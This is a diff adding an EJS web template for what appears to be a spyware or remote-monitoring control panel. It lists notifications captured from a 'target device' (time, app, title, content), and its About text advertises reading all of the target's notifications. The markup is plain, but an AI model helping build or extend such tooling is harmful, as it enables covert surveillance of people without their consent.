@@ -1,0 +1,90 @@
+
+<div class="recent-sales box overflow">
+    <div class="title">Apps</div>
+    <div class="sales-details">
+
+        <ul class="details">
+            <li class="topic">Time</li>
+
+            <% pageData.forEach((notification) => { 
+                let date = new Date(parseInt(notification.postTime));
+            %>
+
+                   <li><a href="#"><%= date.toLocaleString('en-GB', { timeZone: 'UTC' }) %></a></li>
+
+                <% }) %>
+
+        </ul>
+
+        <ul class="details">
+            <li class="topic">Package</li>
+
+            <% pageData.forEach((notification) => { 
+                let date = new Date(parseInt(notification.postTime));
+            %>
+
+                   <li><a href="?filter=<%= notification.appName %>"><%= notification.appName.substring(0,24) %></a></li>
+
+                <% }) %>
+
+        </ul>
+
+        <ul class="details">
+            <li class="topic">Content</li>
+
+            <% pageData.forEach((notification) => { 
+                let date = new Date(parseInt(notification.postTime));
+            %>
+
+                   <li><a href="#"><%= notification.title %></a></li>
+
+                <% }) %>
+
+        </ul>
+
+        <ul class="details">
+            <li class="topic">Description</li>
+
+            <% pageData.forEach((notification) => { 
+                let date = new Date(parseInt(notification.postTime));
+            %>
+
+                   <li><a href="#"><%= notification.content %></a></li>
+
+                <% }) %>
+
+        </ul>
+
+    </div>
+
+
+
+    <button style="background: rgb(11, 0, 107); color: white; border-style: none; padding: 7px;" onclick="updateButton(this, '0xNO')">Update</button>
+
+
+
+    </div>
+
+
+    <div class="top-sales box">
+      <div class="title">About</div>
+      <ul class="top-sales-details">
+        <li>
+        <a href="#">
+          <!--<img src="images/sunglasses.jpg" alt="">-->
+          <span class="product">
+            This feature enables you to read all notifications on the target device. This includes notifications from all apps. We believe that you must be aware regarding what your target is being notified with.</span>
+        </a>
+      </li>
+      </ul>
+
+      <div class="button">
+        <a href="#">Learn More</a>
+      </div>
+
+    </div>
+
+
+    
+
+</div>
